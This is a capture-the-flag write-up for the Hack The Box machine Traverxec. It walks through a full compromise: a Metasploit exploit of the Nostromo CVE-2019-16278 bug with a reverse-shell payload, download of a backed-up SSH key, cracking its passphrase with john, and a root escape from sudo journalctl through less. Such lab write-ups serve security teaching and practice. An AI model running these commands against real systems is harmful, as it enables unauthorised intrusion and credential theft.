# Target
| Category          | Details                                                    |
|-------------------|------------------------------------------------------------|
| 📝 **Name**       | [Traverxec](https://app.hackthebox.com/machines/Traverxec) |  
| 🏷 **Type**       | HTB Machine                                                |
| 🖥️ **OS**        | Linux                                                      |
| 🎯 **Difficulty** | Easy                                                       |

# Scan
```
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.83 seconds
```

# Attack path
1. [Gain foothold with RCE in Nostromo 1.9.6 HTTP server (CVE-2019-16278)](#gain-foothold-with-rce-in-nostromo-196-http-server-cve-2019-16278)
2. [Escalate to `david` user due to unrestricted access to backup of private SSH key](#escalate-to-david-user-due-to-unrestricted-access-to-backup-of-private-ssh-key)
3. [Escalate to `root` user due to misconfiguration in sudo access to `journalctl`](#escalate-to-root-user-due-to-misconfiguration-in-sudo-access-to-journalctl)

### Gain foothold with RCE in Nostromo 1.9.6 HTTP server ([CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278)) 
```
┌──(magicrc㉿perun)-[~/attack/HTB Traverxec]
└─$ msfconsole -q -x "use multi/http/nostromo_code_exec; set RHOSTS $TARGET; set LHOST tun0; set LPORT 4444; set target 1; set payload linux/x86/meterpreter/reverse_tcp; run"
[*] Using configured payload cmd/unix/reverse_perl
RHOSTS => 10.129.228.202
LHOST => tun0
LPORT => 4444
target => 1
payload => linux/x86/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.14.161:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x86/meterpreter/reverse_tcp command stager
[*] Sending stage (1017704 bytes) to 10.129.228.202
[*] Meterpreter session 1 opened (10.10.14.161:4444 -> 10.129.228.202:43290) at 2025-05-10 16:50:40 +0200
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid
Server username: www-data
```

### Escalate to `david` user due to unrestricted access to backup of private SSH key
Nostromo `/var/nostromo/conf/nhttpd.conf` shows that user home dir might contain `public_www`
```
homedirs                /home
homedirs_public         public_www
```

#### Exfiltrate `backup-ssh-identity-files.tgz`
```
meterpreter > download /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
```

#### Crack private SSH key password
```
┌──(magicrc㉿perun)-[~/attack/HTB Traverxec]
└─$ tar -zxf backup-ssh-identity-files.tgz && \
ssh2john home/david/.ssh/id_rsa > id_rsa.hash && \
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)     
1g 0:00:00:00 DONE (2025-05-10 17:06) 6.666g/s 1066p/s 1066c/s 1066C/s diamond..heather
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

#### Confirm escalation
```
┌──(magicrc㉿perun)-[~/attack/HTB Traverxec]
└─$ ssh -i home/david/.ssh/id_rsa david@$TARGET
Enter passphrase for key 'home/david/.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) 
```

### Escalate to `root` user due to misconfiguration in sudo access to `journalctl`

#### Identify vulnerability in `bin/server-stats.sh`
```
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

#### As `www-data` user generate 'long' log which will spawn `less` on call to `journalctl`
```
meterpreter > shell
Process 985 created.
Channel 3 created.
logger "$( head -c 10000 < /dev/urandom | tr -dc 'A-Za-z0-9')"
```

#### Execute `journalctl` as root w/o piped `/usr/bin/cat` to spawn `less`
```
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

#### Spawn root shell from `less`
In `less`
```
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```